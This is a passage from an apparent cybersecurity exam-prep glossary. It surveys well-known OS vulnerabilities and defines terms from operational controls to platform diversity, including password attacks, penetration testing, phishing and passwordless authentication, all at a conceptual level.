Linux is a prevalent server OS but can also be used as a desktop or mobile OS. The open-source nature of Linux and the large community of active developers support a very rapid pace of development. This generally results in quick identification and repair of vulnerabilities. Kernel vulnerabilities, misconfigurations, and unpatched systems are common issues in Linux. Despite its reputation for security, its widespread use in the cloud and server infrastructure makes Linux vulnerabilities especially significant.

The widespread adoption of Mobile OS like Android and iOS and their increasing use as primary computing platforms instead of traditional computers make them valuable targets for attack and exploitation. Android is open source, like Linux, resulting in similar benefits and problems. Additionally, Android OS is fragmented among different manufacturers and versions, resulting in inconsistent patching and updates support. iOS, while not open source like Android, has also been impacted by several significant vulnerabilities.

The significance of OS vulnerabilities cannot be overstated, especially as specialized embedded systems, such as IoT, are added to our surroundings. Each system runs specialty operating systems and introduces vulnerabilities and potential pathways into corporate infrastructures.

Example OS Vulnerabilities

1. Microsoft Windows—One of the most notorious vulnerabilities in Windows history was the MS08-067 vulnerability in Windows Server Service. This vulnerability allowed remote code execution if a specially crafted packet was sent to a Windows server. This vulnerability was exploited by the Conficker worm in 2008, which infected millions of computers worldwide. Additionally, MS17-010 represents a significant and critical security update released by Microsoft in March 2017. This update addressed multiple vulnerabilities in Microsoft's implementation of the Server Message Block (SMB) protocol (a network file-sharing protocol) that could allow remote code execution (RCE). Essentially, these vulnerabilities, if exploited, could allow an attacker to install programs; view, change, or delete data; or create new accounts with full user rights.
The significance of MS17-010 is tied closely to the EternalBlue exploit, which leveraged the vulnerabilities in early versions of the SMB protocol for malicious purposes. The most famous misuse of EternalBlue was during the WannaCry ransomware attack in May 2017, where it was used to propagate the ransomware across networks worldwide, leading to massive damage and disruption. This event underlined the critical importance of timely system patching and reinforced the potential global impact of such vulnerabilities.

2. macOS - In 2014, a significant vulnerability called "Shellshock" affected all Unix-based systems, including macOS. It allowed attackers to potentially gain control over a system due to a flaw in the Bash shell. Though it originated from a component in Unix systems, its impact was felt in macOS due to its Unix-based architecture.

3. Android - The Stagefright vulnerability discovered in 2015 is a prominent example for Android. It allowed attackers to execute malicious code on an Android device by sending a specially crafted MMS message. This issue was particularly severe due to the ubiquity of the vulnerable component (the Stagefright media library) across Android versions and devices.

4. iOS - In 2019, Google's Project Zero team discovered a series of vulnerabilities in iOS that nation-state attackers were abusing. These "watering hole" attacks took advantage of several vulnerabilities to gain full access to a device by having the victim visit a malicious website.

5. Linux - The Heartbleed bug in 2014 was a severe vulnerability in many Linux systems' OpenSSL cryptographic software library. The vulnerability allowed attackers to read the systems' memory running the OpenSSL software's vulnerable versions, compromising the secret keys used to protect data.
Operational Security Control - A category of security control that is implemented by people. The control is implemented primarily by people. For example, security guards and training programs are operational controls.
Order of Volatility - The order in which volatile data should be recovered from various storage locations and devices after a security incident occurs.
Organized crime - A type of threat actor that uses hacking and computer fraud for commercial gain. In many countries, cybercrime has overtaken physical crime in terms of the number of incidents and losses. Organized crime can operate across the Internet from a different jurisdiction than its victim, increasing the complexity of prosecution. Criminals will seek any opportunity for profit, but typical activities are financial fraud—against individuals and companies—and blackmail/extortion. Most espionage is thought to be pursued by state actors, but it is not inconceivable that a rogue business might use cyber espionage against its competitors. Such attacks could aim at theft or to disrupt a competitor's business or damage their reputation. Competitor attacks might be facilitated by employees who have recently changed companies and bring insider knowledge with them.
Out-of-Band Management - Accessing the administrative interface of a network appliance using a separate network from the usual data network. This could use a separate VLAN or a different kind of link, such as a dial-up modem.

A serial console or modem port on a router is a physically out-of-band management method. A network appliance can also be managed using a browser-based interface or a virtual terminal over Ethernet and IP. This type of management link is made out-of-band either by connecting the port used for management access to a physically separate network infrastructure or connecting to a dedicated management VLAN. This can be costly to implement, but out-of-band management is more secure and means that access to the device is preserved when there are problems affecting the production network.
Out-of-cycle Logging - A potential indicator of malicious activity where event dates or timestamps are not consistent. A threat actor might also manipulate the system time or change log entry timestamps as a means of hiding activity.
Package Monitoring - Techniques and tools designed to mitigate risks from application vulnerabilities in third-party code, such as libraries and dependencies.

Another important capability in application vulnerability assessment practices includes package monitoring. Package monitoring is associated with vulnerability identification because it tracks and assesses the security of third-party software packages, libraries, and dependencies used within an organization to ensure that they are up to date and free from known vulnerabilities that malicious actors could exploit. Package monitoring is associated with the management of software bill of materials (SBOM - A list of detailed information about the software components and dependencies used in an application or system) and software supply chain risk management practices.

In an enterprise setting, package monitoring is typically achieved through automated tools and governance policies. Automated software composition analysis (SCA - Tools designed to assist with identification of third-party and open-source code during software development and deployment) tools track and monitor the software packages, libraries, and dependencies used in an organization's codebase. These tools can automatically identify outdated packages or packages with known vulnerabilities and suggest updates or replacements. They work by continuously comparing the organization's software inventory against various databases of known vulnerabilities, such as the National Vulnerability Database (NVD) or vendor-specific advisories.

In addition to these tools, organizations often implement governance policies around software usage. These policies may require regular audits of software packages, approval processes for adding new packages or libraries, and procedures for updating or patching software when vulnerabilities are identified.
Packet Analysis - Analysis of the headers and payload data of one or more frames in captured network traffic.

Packet analysis refers to deep-down, frame-by-frame scrutiny of captured traffic using a tool such as Wireshark. The analyzer decodes the packet to show the header fields at data link/MAC, network/IP, and transport (TCP/UDP) layers. At the application layer, it shows both header data and payload contents.

Packet analysis can identify whether packets passing over a standard port have been manipulated in some nonstandard way, to work as a mechanism for a botnet server, for instance. It allows inspection of protocol payloads to try to identify data exfiltration attempts or attempts to contact suspicious domains and URLs. Detailed analysis of the packet contents can help to reveal the tools used in an attack. It is also possible to extract binary files such as potential malware for analysis.
Packet Captures - Network traffic can provide valuable insights into potential breaches. Network traffic is typically analyzed in detail at the level of individual frames or using summary statistics of traffic flows and protocol usage.

A SIEM will store selected information from sensors installed to different points on the network. Information captured from network packets can be aggregated and summarized to show overall protocol usage and endpoint activity. On a typical network, sensors are not configured to record all network traffic, as this would generate a very considerable amount of data. More typically, only packets that triggered a given firewall or IDS rule are recorded. SIEM software will usually provide the ability to pivot from an event or alert summary to opening the underlying packets in an analyzer.

On the other hand, given sufficient resources, a retrospective network analysis (RNA) solution provides the means to record the totality of network events at either a packet header or payload level.

Packet analysis (Analysis of the headers and payload data of one or more frames in captured network traffic) refers to deep-down, frame-by-frame scrutiny of captured traffic using a tool such as Wireshark. The analyzer decodes the packet to show the header fields at data link/MAC, network/IP, and transport (TCP/UDP) layers. At the application layer, it shows both header data and payload contents.

Packet analysis can identify whether packets passing over a standard port have been manipulated in some nonstandard way, to work as a mechanism for a botnet server, for instance. It allows inspection of protocol payloads to try to identify data exfiltration attempts or attempts to contact suspicious domains and URLs. Detailed analysis of the packet contents can help to reveal the tools used in an attack. It is also possible to extract binary files such as potential malware for analysis.
Packet Filtering Firewall - A Layer 3 firewall technology that compares packet headers against ACLs to determine which network traffic to accept.

A packet filtering firewall is configured by specifying a group of rules called an access control list (ACL). Each rule defines a specific type of data packet and the action to take when a packet matches the rule. A packet filtering firewall can inspect the headers of IP packets. Rules are based on the information found in those headers:

1. IP filtering - Accepts or denies traffic based on its source and/or destination IP address. Most firewalls can filter by MAC addresses.

2. Protocol ID/type - Is an IP packet that carries an identified protocol. Most commonly, this is either TCP or UDP data. Other types include Internet Control Message Protocol (ICMP) diagnostic traffic and protocols that facilitate routing.

3. Port filtering/security - Accepts or denies a packet based on the source and destination TCP/UDP port numbers.

If the action is configured to accept or permit, the firewall allows the packet to pass. A drop or deny action silently discards the packet. A reject action blocks the packet but responds to the sender with an ICMP message, such as "port unreachable".

Separate ACLs filter inbound and outbound traffic. Controlling outbound traffic can block applications not authorized to run on the network and defeat malware such as backdoors.
Parallel Processing Test - Running primary and backup systems simultaneously to validate the functionality and performance of backup systems without disrupting normal operations.

Parallel Processing Tests involve running primary and backup systems simultaneously to validate the functionality and performance of backup systems without disrupting normal operations. These tests help organizations ensure their backup systems can handle the same workload as primary systems during an incident. For example, an organization might run parallel processing tests to verify that a backup datacenter can manage the same traffic and processing demand as the primary datacenter in an outage.
Passive Reconnaissance (Penetration Testing) - Penetration testing techniques that do not interact with target systems directly.

Passive reconnaissance (Penetration testing techniques that do not interact with target systems directly) involves gathering information about target systems and networks without directly interacting with them by focusing on collecting publicly available data and passively observing network traffic. Common techniques used in passive reconnaissance include:

1. Open-Source Intelligence (OSINT) - Collecting publicly available information from various sources like search engines, social media, public databases, and websites.

2. Network Traffic Analysis - Monitoring network traffic to identify patterns, devices, IP addresses, and potential vulnerabilities without actively generating traffic.

Passive reconnaissance helps penetration testers gather initial information on a target's digital footprint. It is less intrusive and carries a lower detection risk than active reconnaissance techniques.
Passive Security Control - An enumeration, vulnerability, or incident detection scan that analyzes only intercepted network traffic rather than sending probes to a target. More generally, passive reconnaissance techniques are those that do not require direct interaction with the target. A passive security control is one that does not require any sort of client or agent configuration or host data transfer to operate. For example, network traffic can be directed or copied to a sensor and scanned by an analysis engine. This control is completely passive. Hosts on the network would be unaware that it is operating. The control has no addressable interface.
Password Attacks - Any attack where the attacker tries to gain unauthorized access to and use of passwords.

When a user chooses a password, the plaintext value is converted to a cryptographic hash. This means that, in theory, no one except the user (not even the systems administrator) knows the password, because the plaintext should not be recoverable from the hash. A password attack aims to exploit the weaknesses inherent in password selection and management to recover the plaintext and use it to compromise an account.

Online Attacks
An online password attack is where the threat actor interacts with the authentication service directly—a web login form or VPN gateway, for instance. An online password attack can show up in audit logs as repeatedly failed logins and then a successful login, or as successful login attempts at unusual times or locations. Apart from ensuring the use of strong passwords by users, online password attacks can be mitigated by restricting the number or rate of login attempts, and by shunning login attempts from known bad IP addresses.

Note that restricting logins can be turned into a vulnerability as it exposes the account to denial of service attacks. The attacker keeps trying to authenticate, locking out valid users.

Offline Attacks
An offline attack means that the attacker has managed to obtain a database of password hashes, such as %SystemRoot%\System32\config\SAM , %SystemRoot%\NTDS\NTDS.DIT (the Active Directory credential store) or /etc/shadow . Once the password database has been obtained, the cracker does not interact with the authentication system. The only indicator of this type of attack (other than misuse of the account in the event of a successful attack) is a file system audit log that records the malicious account accessing one of these files. Threat actors can also read credentials from host memory, in which case the only reliable indicator might be the presence of attack tools on a host.

If the attacker cannot obtain a database of passwords, a packet sniffer might be used to obtain the client response to a server challenge in an authentication protocol. Some protocols send the hash directly; others use the hash to derive an encryption key. Weaknesses in protocols using derived keys can allow for the extraction of the hash for cracking.

Brute Force Attacks
A type of password attack where an attacker uses an application to exhaustively try every possible alphanumeric combination to crack encrypted passwords.

A brute force attack attempts every possible combination in the output space to try to match a captured hash and derive the plaintext that generated it. The output space is determined by the number of bits used by the algorithm (128-bit MD5 or 256-bit SHA256, for instance). The larger the output space and the more characters that were used in the plaintext password, the more difficult it is to compute and test each possible hash to find a match. Brute force attacks are heavily constrained by time and computing resources, and are therefore most effective at cracking short passwords. However, brute force attacks distributed across multiple hardware components, like a cluster of high-end graphics cards, can be successful at cracking longer passwords.

Dictionary Attacks
A type of password attack that compares encrypted passwords against a predetermined list of possible password values.

A dictionary attack can be used where there is a good chance of guessing the likely value of the plaintext, such as a noncomplex password. The software generates hash values from a dictionary of plaintexts to try to match one to a captured hash.

Hybrid Attacks
An attack that uses multiple attack methods, including dictionary, rainbow table, and brute force attacks when trying to crack a password.

A hybrid password attack uses a combination of dictionary and brute force attacks. It is principally targeted against naive passwords with inadequate complexity, such as james1 . The password cracking algorithm tests dictionary words and names in combination with a mask that limits the number of variations to test for, such as adding numeric prefixes and/or suffixes.

Password Spraying
A brute force attack in which multiple user accounts are tested with a dictionary of common passwords.

Password spraying is a horizontal brute force online attack. This means that the attacker chooses one or more common passwords (for example, password or 123456 ) and tries them in conjunction with multiple usernames.
Password Best Practices - Rules to govern secure selection and maintenance of knowledge factor authentication secrets, such as length, complexity, age, and reuse.

A password best practices policy instructs users on choosing and maintaining passwords. More generally, a credential management policy should instruct users on how to keep their authentication method secure, whether this be a password, smart card, or biometric ID. The credential management policy also needs to alert users to diverse types of social engineering attacks. Users need to be able to spot phishing and pharming attempts, so that they do not enter credentials into an unsecure form or spoofed site.

To supplement best practice awareness, system-enforced account policies can help to enforce credential management principles by stipulating requirements for user-selected passwords:

1. Password Length - enforces a minimum length for passwords. There may also be a maximum length.

2. Password Complexity - enforces password complexity rules (such as no use of a username within the password and a combination of at least eight uppercase/lowercase alphanumeric and non-alphanumeric characters).

3. Password Age - forces the user to select a new password after a set number of days.

4. Password Reuse and History - prevents the selection of a password that has been used already. The history attribute sets how many previous passwords are blocked. The minimum age attribute prevents a user from quickly cycling through password changes to revert to a preferred phrase.

Password aging and expiration can mean the same thing. However, some systems distinguish between them. If this is the case, aging means that the user can still log on with the old password after the defined period, but they must then immediately choose a new password. Expiration means that the user can no longer sign in with the outdated password and the account is effectively disabled.

Password reuse can also mean using a work password elsewhere (on a retail website, for instance). This sort of behavior can only be policed by soft policies.
Password Manager - Software that can suggest and store site and app passwords to reduce risks from poor user choices and behavior. Most browsers have a built-in password manager.

Users often adopt poor credential management practices that are hard to control, such as using the same password for corporate networks and consumer websites. This makes enterprise network security vulnerable to data breaches from these websites. This risk is mitigated by a password manager:

1. The user selects a password manager app or service. Most operating systems and browsers implement password managers. Examples include Windows Credential Manager and Apple's iCloud Keychain. If using a third-party password manager, the user installs a plug-in for their chosen browser.

2. The user secures the password vault with a master password. The vault is likely to be stored in the cloud so that accounts can be accessed across multiple devices, but some password managers offer local storage only.

3. When the user creates or updates an account, the password manager generates a random password. The parameters can be adjusted to meet whatever length and complexity policy is required by the site.

4. When the user subsequently browses a site, the password manager validates the site's identity using its digital certificate and presents an option for the user to fill in the password.

The main risks from password managers are selection of a weak master password, compromise of the vendor's cloud storage or systems, and impersonation attacks designed to trick the manager into filling a password to a spoofed site.
Password Spraying - A brute force attack in which multiple user accounts are tested with a dictionary of common passwords.

Password spraying is a horizontal brute force online attack. This means that the attacker chooses one or more common passwords (for example, password or 123456 ) and tries them in conjunction with multiple usernames.
Passwordless - Multifactor authentication scheme that uses ownership and biometric factors, but not knowledge factors.

Passwordless means that the whole authentication system no longer processes knowledge-based factors. The FIDO2 with WebAuthn specifications provides a framework for passwordless authentication. It works basically as follows:

1. The user chooses either a roaming authenticator, such as a security key, or a platform authenticator implemented by the device OS, such as Windows Hello or Face ID/Touch ID for macOS and iOS.

2. The user configures a secure method or local gesture to confirm presence and authenticates the device. This gesture could be a fingerprint, face recognition, or PIN. This credential is only ever validated locally by the authenticator.

3. The user registers with a web application or service, referred to as a relying party. For each new relying party, the authenticator generates a public/private key pair. The user's client browser obtains the public key from the authenticator and registers it to associate it with an account on the relying party.

4. When presented with an authentication challenge, the user performs the local gesture to unlock the private key. The private key is used to sign a confirmation that the local gesture worked, which is then sent to the relying party.

5. The relying party uses the public key to verify the signature and authenticate the account session.

As with FIDO U2F, this provides similar security to smart card authentication, but does not require accounts to have digital certificates and PKI, reducing the management burden. FIDO2 WebAuthn improves on FIDO U2F by adding an application programming interface (API) that allows web applications to work without a password element to authentication. Most FIDO U2F authenticators should also support FIDO2/WebAuthn.

For a passwordless system to be secure, the authenticator must be trusted and resistant to spoofing or cloning attacks. Attestation is a mechanism for an authenticator device, such as a FIDO security key or the TPM in a PC or laptop, to prove that it is a root of trust. Each security key is manufactured with an attestation and model ID. During the registration step, if the relying party requires attestation, the authenticator uses this key to send a report. The relying party can check the attestation report to verify that the authenticator is a known brand and model and supports whatever cryptographic properties the relying party demands.

Note that the attestation key is not unique; if it were unique, it would be easy to identify individuals and be a serious threat to privacy. Instead, it identifies a particular brand and model.
Patch - A small unit of supplemental code meant to address either a security problem or a functionality flaw in a software package or operating system.
Patch Management - Identifying, testing, and deploying OS and application updates. Patches are often classified as critical, security-critical, recommended, and optional.
Payload - The payload is an action performed by the malware other than simply replicating or persisting on a host. Examples of payload classifications include spyware, rootkit, remote access Trojan (RAT), and ransomware.
Payment Card Industry Data Security Standard (PCI DSS) - The information security standard for organizations that process credit or bank card payments. Penetration tests also play an important role in compliance audits, as many regulations require organizations to conduct regular penetration testing as part of their cybersecurity program. For instance, the Payment Card Industry Data Security Standard (PCI DSS) mandates annual and proactive penetration tests for organizations handling cardholder data.
Penetration Testing (How) - A penetration test—often shortened to pen test —uses authorized hacking techniques to discover exploitable weaknesses in the target's security systems. Pen testing is also referred to as ethical hacking. A pen test might involve the following steps:

1. Verify a Threat Exists - In cybersecurity, a threat, such as system or network vulnerability, can include anything that provides a negative action or event of a system, network, or application. The use of surveillance, social engineering, network scanners, and vulnerability assessment tools can be used to identify a vector by which vulnerabilities could be exploited.

2. Bypass Security Controls - Look for easy ways to attack the system. For example, if the network is strongly protected by a firewall, is it possible to gain physical access to a computer in the building and run malware from a USB stick?

3. Actively Test Security Controls - Probe controls for configuration weaknesses and errors, such as weak passwords or software vulnerabilities.

4. Exploit Vulnerabilities - Prove that a vulnerability is high risk by exploiting it to gain access to data or install backdoors.

The key difference from passive vulnerability assessment is that an attempt is made to actively test security controls and exploit any vulnerabilities discovered. Pen testing is an intrusive assessment technique. For example, a vulnerability scan may reveal that an SQL Server has not been patched to safeguard against a known exploit. A penetration test would attempt to use the exploit to perform code injection and compromise the server. This provides active testing of security controls.

Active and Passive Reconnaissance
Active and passive reconnaissance provide crucial information that helps penetration testers understand target systems and identify potential vulnerabilities to plan an attack effectively. A combination of active and passive reconnaissance techniques yields the most comprehensive information regarding the target environment during a penetration testing engagement.

Active reconnaissance (Penetration testing techniques that interact with target systems directly) involves actively probing and interacting with target systems and networks to gather information. Active reconnaissance includes activities that generate network traffic by directly requesting information from target systems. Active reconnaissance aims to discover and obtain information about the target infrastructure, services, and potential vulnerabilities. Common techniques used in active reconnaissance include the following:

1. Port Scanning - Scanning a target network to identify open ports and the services running on them.

2. Service Enumeration - Interacting with identified services to gather information about their versions, configurations, and potential vulnerabilities.

3. OS Fingerprinting - Attempting to identify the operating system running on target machines by analyzing network responses and behavior.

4. DNS Enumeration - Gathering information about the target's DNS infrastructure, such as domain names, subdomains, and IP addresses.

5. Web Application Crawling - Exploring web applications to identify pages, directories, and potential vulnerabilities.

Passive reconnaissance (Penetration testing techniques that do not interact with target systems directly) involves gathering information about target systems and networks without directly interacting with them by focusing on collecting publicly available data and passively observing network traffic. Common techniques used in passive reconnaissance include:

1. Open-Source Intelligence (OSINT) - Collecting publicly available information from various sources like search engines, social media, public databases, and websites.

2. Network Traffic Analysis - Monitoring network traffic to identify patterns, devices, IP addresses, and potential vulnerabilities without actively generating traffic.

Passive reconnaissance helps penetration testers gather initial information on a target's digital footprint. It is less intrusive and carries a lower detection risk than active reconnaissance techniques.

Known, Partially Known, and Unknown Testing Methods
The decision to use a known environment, partially known environment, or unknown environment penetration test is influenced by several factors, such as knowledge regarding the target system or network, the organization's risk appetite, and compliance requirements. Budget and resource constraints may also contribute to selecting the penetration testing method, as known environment testing generally requires fewer resources than partially known or unknown environment testing. The objectives of the penetration test influence the choice, with known environment testing suitable for assessing known vulnerabilities and partially known or unknown environment testing preferred for identifying unknown vulnerabilities. The complexity of the target system or network is also a factor, as more complex systems may necessitate more comprehensive testing methods. Organizations often combine different methods to achieve different objectives.

Penetration Testing Method

1. Known Environment Penetration Testing - In known environment penetration testing, the tester has detailed knowledge about the target system or network, including information about the network architecture, hardware and software configurations, system vulnerabilities, and users.

2. Partially Known Environment Penetration Testing - In partially known environment penetration testing, the tester possesses limited knowledge about the target system or network, such as information about the system architecture, specific technologies in use, or partial system configurations. During a partially known environment penetration test, the tester may employ reconnaissance techniques to gather additional information about the target, including scanning the network, fingerprinting services, or conducting open-source intelligence (OSINT) gathering. The information collected is used to assess security controls by simulating attack vectors and exploiting vulnerabilities.

3. Unknown Environment Penetration Testing - In unknown environment penetration testing, the tester has little prior knowledge about the target system or network. This type of testing aims to mimic a scenario where an attacker has no preexisting information about the target infrastructure. The purpose is to identify potential vulnerabilities and assess the organization's ability to withstand an attack from an unknown adversary. During an unknown environment penetration test, the tester must perform extensive reconnaissance to gain knowledge about the target, such as passive information gathering, active scanning, social engineering, and other techniques to discover potential vulnerabilities. The objective is to identify weaknesses that might be exploitable by a skilled attacker.
Penetration Testing (Why / Who) - A test that uses active tools and security utilities to evaluate security by simulating an attack on a system. A pen test will verify that a threat exists, then will actively test and bypass security controls, and will finally exploit vulnerabilities on the system.

Penetration testing, or pen testing, is a more aggressive approach to vulnerability management. Ethical hackers attempt to breach an organization's security in this practice, exploiting vulnerabilities to demonstrate their potential impact. While automated vulnerability scans and threat feeds are essential components of a robust security program, they may sometimes fail to identify specific vulnerabilities that a penetration test can uncover.

Penetration testing involves human ingenuity and creativity, which allows for discovering complex vulnerabilities that automated tools often miss. For example, vulnerabilities introduced by the application's design and implementation and not coding errors can often go unnoticed by automated scanners. Penetration testers can manipulate an application's functionality to perform actions in ways not intended by its developers, leading to exploitation. Certain types of authentication bypass vulnerabilities or chained vulnerabilities (where multiple minor issues can be combined to create a significant security flaw) are often beyond the detection capabilities of automated scanning tools.

Penetration tests also excel at identifying vulnerabilities associated with improper configurations or weak security policies. While automated scanning methods provide critical vulnerability data, penetration testing provides a deeper and more comprehensive analysis of an organization's security posture.

1. Unknown environment (previously known as black box) testing - Is when the consultant/attacker has no privileged information about the network and its security systems. This type of test requires the consultant/attacker to perform an extensive reconnaissance phase. These tests are useful for simulating the behavior of an external threat.

2. Known environment (previously known as white box) testing - Is when the consultant/attacker has complete access to information about the network. These tests are useful for simulating the behavior of a privileged insider threat.

3. Partially known environment (previously known as gray box) testing - Is when the consultant/attacker has some information. This type of test requires partial reconnaissance on the part of the consultant/attacker.

Penetration testing also evaluates vendors' security posture and identifies potential vulnerabilities in their systems, networks, and applications. By conducting penetration tests on vendor infrastructure or seeking evidence that penetration tests have been performed, organizations can gain insights into the vulnerabilities that attackers could exploit, helping them understand the potential risks associated with partnering with the vendor. Penetration testing provides a comprehensive assessment of the vendor's security resilience, allowing businesses to make informed decisions about their suitability as a vendor. Penetration tests improve the vendor assessment process by validating the effectiveness of security controls, uncovering hidden weaknesses, and assisting risk management practices.
Percent Encoding (URL) - A mechanism for encoding characters as hexadecimal values delimited by the percent sign.

A URL can contain only unreserved and reserved characters from the standard set. Reserved characters are used as delimiters within the URL syntax and should only be used unencoded for those purposes. The reserved characters are the following:

: / ? # [ ] @ ! $ & ' ( ) * + , ; =

There are also unsafe characters, which cannot be used in a URL. Control characters, such as null string termination, carriage return, line feed, end of file, and tab, are unsafe. Percent encoding allows a user-agent to submit any safe or unsafe character (or binary data) to the server within the URL. Its legitimate uses are to encode reserved characters within the URL when they are not part of the URL syntax and to submit Unicode characters. Percent encoding can be misused to obfuscate the nature of a URL (encoding unreserved characters) and submit malicious input.
Perfect Forward Secrecy (PFS) - A characteristic of transport encryption that ensures if a key is compromised, the compromise will only affect a single session and not facilitate recovery of plaintext data from other sessions.

PFS uses Diffie-Hellman (D-H) key agreement to create ephemeral session keys without using the server's private key. Diffie-Hellman allows Alice and Bob to derive the same shared secret by sharing some related values. In the agreement process, they share some of them but keep others private. Mallory cannot possibly learn the secret from the values that are exchanged publicly. The authenticity of the values sent by the server is proved by using a digital signature.

Using ephemeral session keys means that any future compromise of the server will not translate into an attack on recorded data. Also, even if an attacker can obtain the key for one session, the other sessions will remain confidential. This massively increases the amount of cryptanalysis that an attacker would have to perform to recover an entire "conversation."

PFS using the modular arithmetic is called Diffie-Hellman Ephemeral (DHE). PFS is now more usually implemented as Elliptic Curve DHE (ECDHE).
Permissions - Security settings that control access to objects including file system items and network resources.
Personal Area Networks (PANs) - A network scope that uses close-range wireless technologies (usually based on Bluetooth or NFC) to establish communications between personal devices, such as smartphones, laptops, and printers/peripheral devices.
Personal Identification Number (PIN) - A number used in conjunction with authentication devices such as smart cards; as the PIN should be known only to the user, loss of the smart card should not represent a security risk.
Pharming - An impersonation attack in which a request for a website, typically an e-commerce site, is redirected to a similar-looking, but fake, website. A pharming attack is one that redirects users from a legitimate website to a malicious one. Rather than using social engineering techniques to trick the user, pharming relies on corrupting the way the victim's computer performs Internet name resolution so that they are redirected from the genuine site to the malicious one. For example, if mybank.foo should point to the IP address 2.2.2.2, a pharming attack would corrupt the name resolution process to make it point to IP address 6.6.6.6.
Phishing - A type of email-based social engineering attack, in which the attacker sends email from a supposedly reputable source, such as a bank, to try to elicit private information from the victim. Phishing is a combination of social engineering and spoofing. It persuades or tricks the target into interacting with a malicious resource disguised as a trusted one, traditionally using email as the vector. A phishing message might try to convince the user to perform some action, such as installing disguised malware or allowing a remote access connection by the attacker. Other types of phishing campaigns use a spoof website set up to imitate a bank or e‑commerce site or some other web resource that should be trusted by the target. The attacker then emails users of the genuine website to inform them that their account must be updated or with a hoax alert or alarm, supplying a disguised link that actually leads to the spoofed site. When the user authenticates with the spoofed site, their login credentials are captured.
Physical Attacks - An attack directed against cabling infrastructure, hardware devices, or the environment of the site facilities hosting a network.

A physical attack is one directed against cabling infrastructure, hardware devices, or the environment of the site facilities hosting the network.

Brute Force
A brute force physical attack can take several different forms, some examples of which are the following:

1. Smashing a hardware device to perform physical denial of service (DoS).

2. Breaking into premises or cabinets by forcing a lock or gateway. This is likely to be an indicator of theft or tampering.

Preventing theft is often impossible to guarantee, so knowing that something has been stolen is important for things like data breach reporting and revoking access permissions. A system that is tamper-evident will display visible signs of forced entry or use that are difficult for a threat actor to disguise.

Environmental
An environmental attack (A physical threat directed against power, cooling, or fire suppression systems) could be an attempt to perform denial of service. For example, a threat actor could try to destroy power lines, cut through network cables, or disrupt cooling systems. Alternatively, environmental and building maintenance systems are known vectors for threat actors to try to gain access to company networks.

The risk from physical attacks means that premises must be monitored for signs of physical damage or the addition of rogue devices.

RFID Cloning
Radio Frequency ID (RFID - A means of encoding information into passive tags, which can be energized and read by radio waves from a reader device) is a means of encoding information into passive tags. When a reader is within range of the tag, it produces an electromagnetic wave that powers up the tag and allows the reader to collect information from it. This technology can be used to implement contactless building access control systems.

RFID cloning and skimming refer to ways of counterfeiting contactless building access cards or badges:

1. Card Cloning (Making a copy of a contactless access card) - This refers to making one or more copies of an existing card. A lost or stolen card with no cryptographic protections can be physically duplicated. Card loss should be reported immediately so that it can be revoked and a new one issued. If there was a successful attack, it might be indicated by use of a card in a suspicious location or time of day.

2. Skimming (Making a duplicate of a contactless access card by copying its access token and programming a new card with the same data) - This refers to using a counterfeit reader to capture card or badge details, which are then used to program a duplicate. Some types of proximity cards can quite easily be made to transmit the credential to a portable RFID reader that a threat actor could conceal on their person.

These attacks can generally only target "dumb" access cards that transfer static tokens rather than perform cryptoprocessing. If use of the cards is logged, compromise might be indicated by impossible travel and concurrent use access patterns.

Near-field communication (NFC) is derived from RFID and is also often used for contactless cards. It works only at very close range and allows two-way communications between NFC peers.
Physical Penetration Testing - Assessment techniques that extend to site and other physical security systems.

Physical penetration testing, or physical security testing, describes assessments of an organization's physical security practices and controls. It involves simulating real-world attack scenarios to identify vulnerabilities and weaknesses in physical security systems, such as access controls, surveillance, and perimeter defenses. Physical penetration testing aims to assess the effectiveness of physical security controls and identify potential entry points or weaknesses that an attacker could exploit. During physical penetration testing, a skilled tester attempts to gain unauthorized physical access to restricted areas, sensitive information, or critical assets within the organization using techniques like social engineering, tailgating, lock picking, bypassing alarms or surveillance systems, and exploiting physical vulnerabilities.
Physical Security Control - A category of security control that acts against in-person intrusion attempts. Controls such as security cameras, alarms, gateways, locks, lighting, and security guards that deter and detect access to premises and hardware are often placed in a separate category from technical controls.	

Physical security is critical to cybersecurity operations because it provides the first line of defense against physical access to an organization's critical assets. Cybersecurity is about securing digital assets and protecting the physical components that house those assets, such as servers, datacenters, and other critical infrastructure.

Practical examples of physical security measures in cybersecurity operations include access control mechanisms, such as biometric scanners, smart cards, key fobs, and surveillance systems, including video cameras, motion sensors, and alarms. Additionally, backup power, redundant cooling, and fire suppression systems are critical components of physical security in datacenters.

Physical access controls depend on the same access control fundamentals as technical system security:

1. Authentication - Creates access lists and identifies mechanisms to allow approved persons through the barriers.

2. Authorization - Creates barriers around a resource to control access through defined entry and exit points.

3. Accounting - Records when entry/exit points are used and detects security breaches.

Physical security is often implemented by incorporating zones. Each zone is separated by its own barrier(s). One or more security mechanisms control entry and exit points through the barriers. Progression through each zone should be increasingly restrictive.
Pivoting - When an attacker uses a compromised host (the pivot) as a platform from which to spread an attack to other points in the network.
Plaintext / Cleartext - Unencrypted data that is meant to be encrypted before it is transmitted, or the result of decryption of encrypted data. It is an unencrypted message.
Platform as a Service (PaaS) - A cloud service model that provisions application and database services as a platform for development of apps.

Platform as a service (PaaS) provides resources somewhere between SaaS and IaaS. A typical PaaS solution would provide servers and storage network infrastructure (as per IaaS) but also provide a multi-tier web application/database platform on top. This platform could be based on Oracle and MS SQL or PHP and MySQL. Examples include Oracle Database, Microsoft Azure SQL Database, and Google App Engine.

Distinct from SaaS, this platform would not be configured to do anything. Your developers would create the software (the CRM or e‑commerce application) that runs using the platform. The service provider would be responsible for the integrity and availability of the platform components, and you would be responsible for the security of the application you created on the platform.
Platform Diversity - Cybersecurity resilience strategy that increases attack costs by provisioning multiple types of controls, technologies, vendors, and crypto implementations.

Platform diversity is a concept in cybersecurity that refers to using multiple technologies, operating systems, and hardware or software components within an organization's infrastructure. By incorporating a variety of platforms, businesses can reduce the risk of a single vulnerability or attack affecting their entire infrastructure. This approach is important for cybersecurity operations, as it helps create a more resilient environment that can better withstand cyber threats.

When an organization relies on a single technology or platform, an attacker who discovers a vulnerability can potentially compromise the entire system. However, with platform diversity, even if one component is compromised, other parts of the system remain secure, limiting the potential damage. Furthermore, a diverse technology landscape can make it more challenging for threat actors to navigate, as they must be familiar with multiple platforms and exploit techniques. In this way, platform diversity deters potential attackers and contributes to the overall robustness of an organization's cybersecurity posture.
Platform Diversity and Defense in Depth - Cybersecurity resilience strategy that increases attack costs by provisioning multiple types of controls, technologies, vendors, and crypto implementations.

